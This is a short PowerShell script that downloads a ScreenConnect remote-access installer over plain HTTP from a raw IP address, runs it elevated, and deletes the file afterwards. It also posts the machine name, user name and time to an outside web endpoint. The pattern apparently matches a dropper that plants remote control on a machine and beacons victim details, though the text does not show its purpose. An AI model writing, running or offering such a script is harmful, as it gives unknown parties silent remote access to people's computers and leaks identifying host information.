$Temp = Join-Path $env:TEMP "ScreenConnect.ClientSetup.msi"
$Url = "http://216.250.250.192:8040/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest&c=WILLOW%20CENTERED%20TECH&c=&c=&c=&c=&c=&c=&c="

$WorkerURL = "https://install.willowcenteredtech.com"


function Send-Notification {
    param(
        $Message
    )

    try {

        Invoke-RestMethod `
        -Uri $WorkerURL `
        -Method POST `
        -ContentType "application/json" `
        -Body (@{
            message = $Message
        } | ConvertTo-Json)

    }
    catch {

    }
}



try {

    Invoke-WebRequest `
    -Uri $Url `
    -OutFile $Temp `
    -ErrorAction Stop


    Start-Process `
    $Temp `
    -ArgumentList "-ai" `
    -Verb RunAs `
    -Wait


    Send-Notification "
✅ Agent Installation Complete

Computer: $env:COMPUTERNAME
User: $env:USERNAME
Time: $(Get-Date)
"


}
catch {

    Send-Notification "
❌ Agent Installation Failed

Computer: $env:COMPUTERNAME
User: $env:USERNAME

Error:
$($_.Exception.Message)
"

}


finally {

    if(Test-Path $Temp){
        Remove-Item $Temp -Force
    }

}